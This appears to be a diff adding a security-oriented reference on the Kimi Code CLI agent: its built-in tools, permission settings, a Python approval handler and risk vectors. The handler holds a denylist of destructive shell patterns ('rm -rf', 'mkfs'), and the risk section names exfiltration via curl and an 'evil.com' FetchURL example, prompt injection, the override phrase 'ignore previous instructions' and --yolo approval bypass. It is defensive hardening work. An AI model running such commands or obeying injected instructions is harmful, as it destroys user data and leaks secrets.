@@ -96,6 +96,37 @@ prompt: |-
 
     **IMPORTANT:** You must use the "claudine" skill when executing this task.
     **IMPORTANT:** Preserve all frontmatter properties that exist in this document. Your updates will only be to the BODY of this document.
+
+    ## Built in Tools
+
+    All Agentic platforms have a built-in tools which they use to solve problems with. You need to research what tools the Agent platform you're focusing on provides. List out all the built-in tools with:
+
+    - a name,
+    - description,
+    - parameters provided to the tool,
+    - and 2-3 examples of how this tool might be called by the agent
+
+    ### Permissions
+
+    Each Agentic platforms will allow for the configuration of what tools are allowed and how their parameters can be constrained. Your task is to:
+
+    - identify the best URL that documents the permission configuration for the Agent you are focused on
+    - identify the various ways permission configuration is set:
+        - user scoped configuration
+        - repo scoped configuration
+        - agent/subagent configuration?
+        - slash command configuration?
+        - CLI switch configuration?
+        - others?
+    - give 2-3 examples of how someone might configure their Agent and why they might do it that way
+
+    ### Risk Vectors
+
+    Once you've described the Agent's tools, evaluate where you think the greatest risks might be within the use of these tools. Create a markdown list of risks and for each risk:
+
+    - describe the risk (with context)
+    - discuss how this risk might be able to be identified in semi-structured or unstructured content
+    - discuss how you might help to lower this risk based on what you know about the Agent's capabilities, configuration, and features
 closure: |-
     ## Task
 
@@ -168,6 +199,14 @@ closure: |-
     - `body_hash` to the xxHash value for this document's Markdown body content (not frontmatter)
         - Compute by printing the body content and piping to `bh` as STDIN
         - If the `bh` utility is not found in the executable path, leave this blank
+
+    ## Built in Tools
+
+    Make sure to add the following properties to this document's Frontmatter:
+
+    - `permissions_url` - the URL for documentation on setting permissions on the agent.
+    - `built_in_tools` - should be a dictionary where the _keys_ are the tool name and the _values_ are the description of the tool along with a usage example.
+    - `risk_vectors` - should be a list of named risks, along with how to identify this risk, and ideas on how the Agent might be able to lower this risk.
 agent_version: "1.12.0"
 has_blocking_pre_tool_event: true
 pre_tool_influence: guarantee
@@ -834,4 +873,402 @@ exec kimi --wire "$@"
 | Sandbox isolation | No | -- | Runs with full user permissions |
 | Root detection | No | -- | Must be implemented in wrapper |
 | Permission bypass | Yes | `--yolo` / `--print` | All-or-nothing; no partial approval |
+
+---
+
+## Built-in Tools
+
+Kimi Code CLI provides 14 built-in tools, each referenced by its Python module path in agent YAML configurations (`module:ClassName` format). Tools that modify files or execute commands require user approval in standard mode; this approval is bypassed entirely in `--yolo` mode.
+
+### Tool Catalog
+
+#### 1. Shell
+
+- **Module path:** `kimi_cli.tools.shell:Shell`
+- **Description:** Executes shell commands in the user's environment. Requires user approval before execution.
+- **Parameters:**
+  - `command` (string, required): The shell command to execute.
+  - `timeout` (integer, optional): Execution timeout in seconds. Default: 60, maximum: 300.
+- **Examples:**
+  - `Shell(command="cargo test --lib", timeout=120)` -- run project tests with a 2-minute timeout.
+  - `Shell(command="git diff --stat HEAD~3")` -- view recent git changes.
+  - `Shell(command="find . -name '*.rs' | wc -l")` -- count Rust source files.
+
+#### 2. ReadFile
+
+- **Module path:** `kimi_cli.tools.file:ReadFile`
+- **Description:** Reads the contents of a text file with optional line offset and line count constraints. Does not require approval.
+- **Parameters:**
+  - `path` (string, required): Path to the file.
+  - `line_offset` (integer, optional): Starting line number (0-indexed).
+  - `n_lines` (integer, optional): Number of lines to read. Maximum: 1000. Lines exceeding 2000 characters are truncated.
+- **Examples:**
+  - `ReadFile(path="src/main.rs")` -- read an entire source file.
+  - `ReadFile(path="logs/app.log", line_offset=500, n_lines=100)` -- read lines 500-599 of a log file.
+  - `ReadFile(path="Cargo.toml", n_lines=30)` -- read the first 30 lines of a manifest.
+
+#### 3. ReadMediaFile
+
+- **Module path:** `kimi_cli.tools.file:ReadMediaFile`
+- **Description:** Reads image or video files for visual analysis. Maximum file size: 100MB. Does not require approval.
+- **Parameters:**
+  - `path` (string, required): Path to the media file.
+- **Examples:**
+  - `ReadMediaFile(path="docs/architecture.png")` -- analyze a diagram image.
+  - `ReadMediaFile(path="screenshots/error.jpg")` -- inspect a screenshot of an error.
+
+#### 4. WriteFile
+
+- **Module path:** `kimi_cli.tools.file:WriteFile`
+- **Description:** Creates or overwrites a file with new content. Requires user approval.
+- **Parameters:**
+  - `path` (string, required): Path to the file.
+  - `content` (string, required): The content to write.
+  - `mode` (string, optional): `"overwrite"` (default) or `"append"`.
+- **Examples:**
+  - `WriteFile(path="src/config.rs", content="pub const VERSION: &str = \"1.0\";\n")` -- create a new source file.
+  - `WriteFile(path="notes.md", content="\n## New Section\n", mode="append")` -- append to an existing file.
+  - `WriteFile(path=".env.example", content="DATABASE_URL=\nAPI_KEY=\n")` -- create a template config file.
+
+#### 5. StrReplaceFile
+
+- **Module path:** `kimi_cli.tools.file:StrReplaceFile`
+- **Description:** Edits files using exact string replacement. Requires user approval. The `old` string must match exactly once unless `replace_all` is true.
+- **Parameters:**
+  - `path` (string, required): Path to the file.
+  - `edit` (object, required): Contains `old` (string to find) and `new` (replacement string).
+  - `replace_all` (boolean, optional): Replace all occurrences. Default: false.
+- **Examples:**
+  - `StrReplaceFile(path="Cargo.toml", edit={old: 'version = "0.1.0"', new: 'version = "0.2.0"'})` -- bump a version number.
+  - `StrReplaceFile(path="src/lib.rs", edit={old: "pub fn old_name(", new: "pub fn new_name("}, replace_all=true)` -- rename a function across all occurrences.
+
+#### 6. Glob
+
+- **Module path:** `kimi_cli.tools.file:Glob`
+- **Description:** Pattern matching for files and directories. Does not require approval.
+- **Parameters:**
+  - `pattern` (string, required): Glob pattern (e.g., `**/*.rs`).
+  - `directory` (string, optional): Root directory for the search.
+  - `include_dirs` (boolean, optional): Include directory matches.
+- **Examples:**
+  - `Glob(pattern="**/*.ts", directory="src/")` -- find all TypeScript files under `src/`.
+  - `Glob(pattern="**/test_*.py")` -- find all Python test files.
+  - `Glob(pattern="**/Cargo.toml", include_dirs=false)` -- find all Cargo manifests in a workspace.
+
+#### 7. Grep
+
+- **Module path:** `kimi_cli.tools.file:Grep`
+- **Description:** Searches file content using regular expressions, powered by ripgrep. Does not require approval.
+- **Parameters:**
+  - `pattern` (string, required): Regex pattern.
+  - `path` (string, optional): File or directory to search.
+  - `glob` (string, optional): Glob filter for files.
+  - `type` (string, optional): File type filter (e.g., `"rust"`, `"py"`).
+  - `output_mode` (string, optional): `"content"`, `"files_with_matches"`, or `"count"`.
+  - `flags` (object, optional): `-B` (before), `-A` (after), `-C` (context), `-n` (line numbers), `-i` (case-insensitive).
+  - `multiline` (boolean, optional): Enable multiline matching.
+  - `head_limit` (integer, optional): Limit output entries.
+- **Examples:**
+  - `Grep(pattern="TODO|FIXME", path="src/", type="rust")` -- find all TODO comments in Rust files.
+  - `Grep(pattern="fn main", glob="**/*.rs", output_mode="files_with_matches")` -- find files containing a main function.
+  - `Grep(pattern="unsafe", path=".", flags={"-C": 3}, type="rust")` -- find unsafe blocks with 3 lines of context.
+
+#### 8. SearchWeb
+
+- **Module path:** `kimi_cli.tools.web:SearchWeb`
+- **Description:** Conducts internet searches for real-time information. Does not require approval.
+- **Parameters:**
+  - `query` (string, required): Search query.
+  - `limit` (integer, optional): Number of results. Default: 5, maximum: 20.
+  - `include_content` (boolean, optional): Whether to include page content in results.
+- **Examples:**
+  - `SearchWeb(query="rust tokio 1.48 migration guide", limit=5)` -- search for documentation.
+  - `SearchWeb(query="CVE-2026-1234 severity", include_content=true)` -- research a vulnerability.
+
+#### 9. FetchURL
+
+- **Module path:** `kimi_cli.tools.web:FetchURL`
+- **Description:** Fetches webpage content and returns extracted main text. Does not require approval.
+- **Parameters:**
+  - `url` (string, required): The URL to fetch.
+- **Examples:**
+  - `FetchURL(url="https://docs.rs/tokio/latest/tokio/")` -- fetch Rust documentation.
+  - `FetchURL(url="https://api.github.com/repos/owner/repo/releases/latest")` -- fetch JSON API data.
+
+#### 10. Think
+
+- **Module path:** `kimi_cli.tools.think:Think`
+- **Description:** Records the agent's thinking process, suitable for complex reasoning scenarios that benefit from explicit chain-of-thought. Does not require approval.
+- **Parameters:**
+  - `thought` (string, required): The reasoning content.
+- **Examples:**
+  - `Think(thought="The error is in the borrow checker. The variable is moved on line 42 but used on line 50. I need to clone it or use a reference.")` -- record reasoning during debugging.
+  - `Think(thought="There are three approaches: A) refactor the trait, B) add a wrapper, C) use dynamic dispatch. Option B preserves backward compatibility...")` -- reason through design choices.
+
+#### 11. Task
+
+- **Module path:** `kimi_cli.tools.multiagent:Task`
+- **Description:** Dispatches a subagent to execute a task. Subagents cannot access the main agent's context. Requires approval if the subagent performs approval-requiring operations.
+- **Parameters:**
+  - `description` (string, required): Short summary of the task.
+  - `subagent_name` (string, optional): Name of a declared subagent to use.
+  - `prompt` (string, required): Full instructions for the subagent.
+- **Examples:**
+  - `Task(description="Write unit tests", subagent_name="coder", prompt="Write comprehensive tests for src/parser.rs covering edge cases.")` -- delegate test writing to a subagent.
+  - `Task(description="Review security", prompt="Audit the authentication module for common vulnerabilities like SQL injection and XSS.")` -- delegate a security review.
+  - `Task(description="Research alternatives", subagent_name="researcher", prompt="Find and compare Rust HTTP client libraries.")` -- delegate research work.
+
+#### 12. SetTodoList
+
+- **Module path:** `kimi_cli.tools.todo:SetTodoList`
+- **Description:** Creates and manages a task progress list for tracking multi-step work. Does not require approval.
+- **Parameters:**
+  - `todos` (array, required): Array of objects, each with `title` (string) and `status` (`"pending"`, `"in_progress"`, or `"done"`).
+- **Examples:**
+  - `SetTodoList(todos=[{title: "Fix parsing bug", status: "done"}, {title: "Add tests", status: "in_progress"}, {title: "Update docs", status: "pending"}])` -- track progress on a multi-step task.
+
+#### 13. CreateSubagent
+
+- **Module path:** `kimi_cli.tools.multiagent:CreateSubagent`
+- **Description:** Dynamically creates a new subagent type during runtime. **Not enabled by default** -- must be explicitly added to the agent's tool list.
+- **Parameters:**
+  - `name` (string, required): Unique identifier for the subagent.
+  - `system_prompt` (string, required): Role definition and instructions.
+  - `tools` (array, optional): Tool module paths available to the subagent.
+- **Examples:**
+  - `CreateSubagent(name="linter", system_prompt="You are a code quality reviewer. Only report issues, do not fix them.", tools=["kimi_cli.tools.file:ReadFile", "kimi_cli.tools.file:Grep"])` -- create a read-only analysis subagent at runtime.
+  - `CreateSubagent(name="formatter", system_prompt="Format code according to project standards.", tools=["kimi_cli.tools.shell:Shell", "kimi_cli.tools.file:ReadFile"])` -- create a formatting subagent.
+
+#### 14. SendDMail
+
+- **Module path:** `kimi_cli.tools.dmail:SendDMail`
+- **Description:** An experimental tool for checkpoint rollback scenarios. Only available in the `okabe` agent. Not available in the `default` agent.
+- **Parameters:**
+  - `message` (string, required): The message to send.
+  - `checkpoint_id` (integer, required): Target checkpoint ID.
+- **Examples:**
+  - `SendDMail(message="Revert: the refactoring introduced a regression", checkpoint_id=3)` -- roll back to a prior checkpoint.
+
+### Approval Requirements Summary
+
+| Tool | Requires Approval | Category |
+|------|-------------------|----------|
+| Shell | Yes | Command execution |
+| WriteFile | Yes | File modification |
+| StrReplaceFile | Yes | File modification |
+| ReadFile | No | Read-only |
+| ReadMediaFile | No | Read-only |
+| Glob | No | Read-only |
+| Grep | No | Read-only |
+| SearchWeb | No | Read-only |
+| FetchURL | No | Read-only |
+| Think | No | Internal reasoning |
+| SetTodoList | No | Task tracking |
+| Task | Depends on subagent | Delegation |
+| CreateSubagent | No (tool creation) | Delegation |
+| SendDMail | Unknown | Experimental |
+
+**Note:** MCP tool calls also require approval, following the same mechanism as built-in tools that modify state.
+
+### Permissions
+
+**Primary documentation:** [Agents and Subagents](https://moonshotai.github.io/kimi-cli/en/customization/agents.html)
+
+Kimi Code CLI does **not** have a standalone permissions configuration file or a dedicated permissions documentation page. Instead, tool permissions are managed through a combination of agent YAML definitions, CLI flags, and the Wire protocol. There is no granular permission system like Claude Code's `permissions.allow` / `permissions.deny` rules with path patterns.
+
+#### Permission Configuration Methods
+
+**1. Agent YAML: `tools` and `exclude_tools` (agent/subagent scoped)**
+
+The most granular permission control is through agent YAML files, where you explicitly list which tools an agent or subagent may use.
+
+```yaml
+# restricted-agent.yaml
+version: 1
+agent:
+  name: restricted
+  extend: default
+  exclude_tools:
+    - "kimi_cli.tools.shell:Shell"
+    - "kimi_cli.tools.file:WriteFile"
+    - "kimi_cli.tools.file:StrReplaceFile"
+    - "kimi_cli.tools.multiagent:CreateSubagent"
+  system_prompt_path: ./prompt.md
+```
+
+Alternatively, use a positive `tools` list to specify exactly which tools are available:
+
+```yaml
+version: 1
+agent:
+  name: readonly
+  tools:
+    - "kimi_cli.tools.file:ReadFile"
+    - "kimi_cli.tools.file:Glob"
+    - "kimi_cli.tools.file:Grep"
+    - "kimi_cli.tools.web:SearchWeb"
+    - "kimi_cli.tools.web:FetchURL"
+    - "kimi_cli.tools.think:Think"
+  system_prompt_path: ./readonly-prompt.md
+```
+
+**2. CLI flags: `--yolo` / `--yes` / `-y` (session scoped)**
+
+Bypasses all approval prompts for the entire session. Affects all tools equally -- there is no way to selectively auto-approve some tools but not others.
+
+```bash
+# All operations auto-approved
+kimi --yolo
+
+# Or via config file
+# default_yolo = true  in ~/.kimi/config.toml
+```
+
+**3. CLI flag: `--agent-file` (session scoped)**
+
+Selects a custom agent definition that specifies tool restrictions:
+
+```bash
+kimi --agent-file ./restricted-agent.yaml
+```
+
+**4. Wire protocol (runtime, programmatic)**
+
+Wire clients can implement fine-grained, dynamic permission logic by responding to `ApprovalRequest` messages. This is the most flexible approach but requires building a Wire client.
+
+**5. Print mode: `--print` (session scoped)**
+
+Implicitly enables `--yolo`, auto-approving all operations. Intended for CI/CD automation.
+
+```bash
+echo "Fix the linting errors" | kimi --print
+```
+
+#### Not Supported
+
+- **User-scoped permission rules** (no equivalent to Claude Code's `permissions.allow` / `permissions.deny` in settings files)
+- **Repo-scoped permission rules** (no `.kimi/settings.json` with permission overrides)
+- **Enterprise/managed permission policies** (no managed settings mechanism)
+- **Slash command configuration of permissions** (slash commands cannot modify tool access)
+- **Path-based restrictions** (no gitignore-style patterns for file access)
+- **Network/domain restrictions** (no built-in controls for which URLs or domains can be accessed)
+
+#### Configuration Examples
+
+**Example 1: Read-only research agent**
+
+An organization wants to allow the agent to read code and search the web, but prevent any modifications to the filesystem or execution of shell commands.
+
+```yaml
+# research-only.yaml
+version: 1
+agent:
+  name: researcher
+  tools:
+    - "kimi_cli.tools.file:ReadFile"
+    - "kimi_cli.tools.file:ReadMediaFile"
+    - "kimi_cli.tools.file:Glob"
+    - "kimi_cli.tools.file:Grep"
+    - "kimi_cli.tools.web:SearchWeb"
+    - "kimi_cli.tools.web:FetchURL"
+    - "kimi_cli.tools.think:Think"
+  system_prompt_path: ./research-prompt.md
+```
+
+Launch with: `kimi --agent-file ./research-only.yaml`
+
+This approach works because the agent simply does not have access to `Shell`, `WriteFile`, or `StrReplaceFile`.
+
+**Example 2: CI/CD pipeline with Wire-based guardrails**
+
+A team runs Kimi in Wire mode within CI to generate code, but wants to block destructive commands like `rm -rf` and writes to paths outside the project.
+
+```python
+import json, sys, os
+
+PROJECT_ROOT = os.getcwd()
+
+def handle_approval(msg):
+    payload = msg["params"]["payload"]
+    sender = payload["sender"]
+    description = payload.get("description", "")
+
+    # Block destructive shell patterns
+    if sender == "Shell":
+        dangerous = ["rm -rf", "mkfs", "dd if=", "chmod 777", "> /dev/"]
+        if any(p in description for p in dangerous):
+            return "reject"
+
+    # Block writes outside project root
+    if sender in ("WriteFile", "StrReplaceFile"):
+        # Extract path from description if possible
+        if ".." in description or description.startswith("/"):
+            if not description.startswith(PROJECT_ROOT):
+                return "reject"
+
+    return "approve"
+```
+
+This approach provides dynamic, content-aware permission decisions not possible with static configuration alone.
+
+**Example 3: Subagent with strict isolation**
+
+A developer wants the main agent to have full capability but restricts subagents to read-only operations with no shell access and no nested subagent creation.
+
+```yaml
+# main-agent.yaml
+version: 1
+agent:
+  name: main
+  extend: default
+  subagents:
+    worker:
+      path: ./safe-worker.yaml
+      description: "Read-only worker"
+  system_prompt_path: ./main-prompt.md
+```
+
+```yaml
+# safe-worker.yaml
+version: 1
+agent:
+  name: safe_worker
+  extend: default
+  exclude_tools:
+    - "kimi_cli.tools.shell:Shell"
+    - "kimi_cli.tools.file:WriteFile"
+    - "kimi_cli.tools.file:StrReplaceFile"
+    - "kimi_cli.tools.multiagent:Task"
+    - "kimi_cli.tools.multiagent:CreateSubagent"
+  system_prompt_path: ./safe-worker-prompt.md
+```
+
+This prevents subagents from executing commands, modifying files, or spawning further subagents.
+
+### Risk Vectors
+
+- **Unrestricted shell execution via `Shell`**: The Shell tool is the highest-risk built-in tool. It can execute any command the user has access to, including destructive commands (`rm -rf /`, `DROP TABLE`), data exfiltration (`curl` to external servers), and privilege escalation (`sudo`). **Identification:** Look for patterns in the `command` parameter such as `rm -rf`, `sudo`, `chmod 777`, pipe chains to `curl`/`wget` targeting external hosts, `eval`, `exec`, and backtick-enclosed subcommands. In the Wire protocol, these patterns appear in the `ApprovalRequest` `description` field and the `ToolCall` notification's `function.arguments`. **Mitigation:** Use a Wire client to pattern-match `ApprovalRequest` descriptions against a denylist of dangerous commands. For agent YAML-based deployments, exclude `Shell` entirely when shell access is not needed. Never use `--yolo` in environments with untrusted inputs.
+
+- **File writes to sensitive paths via `WriteFile` / `StrReplaceFile`**: These tools can overwrite critical system files, inject malicious code into source files, or write secrets to unintended locations. There is no built-in path restriction -- the agent can write to any path the OS user has access to. **Identification:** Inspect the `path` parameter for writes to system directories (`/etc/`, `/usr/`, `~/.ssh/`, `~/.bashrc`), credential files (`.env`, `credentials.json`, `id_rsa`), or paths outside the project root using `..` traversal. In Wire mode, these appear in `ApprovalRequest` with `sender: "WriteFile"` or `sender: "StrReplaceFile"`. **Mitigation:** Use agent YAML to exclude write tools for subagents that do not need them. In Wire mode, validate the `path` in the `ApprovalRequest` payload against an allowlist of directories. Use a wrapper script that sets `--work-dir` and rejects absolute paths outside it.
+
+- **`--yolo` mode eliminating all safety gates**: When `--yolo` is active (either via CLI flag, `/yolo` slash command, `default_yolo = true` config, or implicitly via `--print` mode), `ApprovalRequest` messages are **never sent** over the Wire protocol. This completely eliminates the only blocking interception mechanism. Every tool call executes without any check. **Identification:** In Wire mode, the absence of `ApprovalRequest` messages for operations that normally require them indicates yolo mode is active. The status bar shows a yellow "YOLO" badge interactively, but there is no Wire-level notification that yolo mode was enabled. **Mitigation:** Never enable `--yolo` when processing untrusted input. For CI/CD pipelines, prefer Wire mode with a custom approval client over `--print` mode. If `--print` is used, restrict the agent's tools via `--agent-file` to a read-only tool set.
+
+- **Data exfiltration via `SearchWeb` / `FetchURL`**: These web tools do not require approval and have no domain restrictions. An agent influenced by prompt injection could use `FetchURL` to send data to an attacker-controlled endpoint (e.g., encoding secrets in query parameters). **Identification:** Monitor `ToolCall` notifications for `SearchWeb` and `FetchURL` with suspicious URLs containing encoded data, unusually long query strings, or domains not related to the task. Look for patterns like `FetchURL(url="https://evil.com/collect?data=...")`. **Mitigation:** In Wire mode, observe `ToolCall` notifications for web tools and send a `cancel` request if suspicious URLs are detected (though this is a race condition). For strict environments, exclude `SearchWeb` and `FetchURL` from the agent's tool list via YAML. There is no built-in domain allowlist or denylist for web tools.
+
+- **Uncontrolled subagent tool escalation via `CreateSubagent`**: The `CreateSubagent` tool (when enabled) allows the agent to dynamically create new subagents with arbitrary tool lists at runtime. This bypasses the static tool restrictions defined in agent YAML files, because the agent itself specifies which tools the new subagent receives. **Identification:** Monitor `ToolCall` notifications for `CreateSubagent` invocations and inspect the `tools` parameter for dangerous tool inclusions like `Shell` or `WriteFile`. **Mitigation:** Do not include `CreateSubagent` in the agent's tool list unless dynamic subagent creation is genuinely needed. When it is needed, implement a Wire client that intercepts the `ApprovalRequest` for the subsequent Task call and validates the subagent's tool set before approving. Prefer statically declared subagents in agent YAML with pre-defined restricted tool lists.
+
+- **MCP tool calls bypassing safety assumptions**: MCP tools are treated as regular tools for approval purposes, but their behavior is opaque -- the agent and Wire client cannot inspect what an MCP server actually does with the inputs it receives. An MCP tool could exfiltrate data, execute destructive operations on external systems, or return prompt-injected responses. **Identification:** MCP tool calls appear as `ApprovalRequest` messages with `sender` matching the MCP tool name. The `ToolResult` notification contains the MCP response, which can be scanned for prompt injection patterns (e.g., "ignore previous instructions", embedded system prompts). **Mitigation:** Only use MCP servers from trusted sources. In Wire mode, scan `ToolResult` output for suspicious patterns and cancel the turn if detected. Use agent YAML `exclude_tools` to remove MCP tools from subagents that do not need them. The [MCP documentation](https://moonshotai.github.io/kimi-cli/en/customization/mcp.html) explicitly recommends maintaining manual approval for high-risk MCP tasks.
+
+- **Context compaction degrading safety instructions**: When context compaction occurs (`CompactionBegin` / `CompactionEnd` events), safety instructions injected earlier in the conversation may be summarized away or lost entirely. The agent may then behave as if no safety constraints were in place. **Identification:** Monitor `StatusUpdate` events for `context_usage` approaching 1.0 and watch for `CompactionBegin`/`CompactionEnd` event pairs. **Mitigation:** Implement a Wire client that detects `CompactionEnd` and re-injects safety-critical instructions via a new `prompt` in the next turn. Use the `system_prompt_path` in agent YAML to embed safety instructions that persist across compaction (system prompts are not compacted). Set `reserved_context_size` in `config.toml` to preserve headroom for safety instructions.
+
+### Sources
+
+- [Agents and Subagents documentation](https://moonshotai.github.io/kimi-cli/en/customization/agents.html)
+- [Wire Mode documentation](https://moonshotai.github.io/kimi-cli/en/customization/wire-mode.html)
+- [MCP documentation](https://moonshotai.github.io/kimi-cli/en/customization/mcp.html)
+- [Configuration files](https://moonshotai.github.io/kimi-cli/en/configuration/config-files.html)
+- [Configuration overrides](https://moonshotai.github.io/kimi-cli/en/configuration/overrides.html)
+- [Print mode](https://moonshotai.github.io/kimi-cli/en/customization/print-mode.html)
+- [Interaction guide](https://moonshotai.github.io/kimi-cli/en/guides/interaction.html)
+- [kimi command reference](https://moonshotai.github.io/kimi-cli/en/reference/kimi-command.html)
 
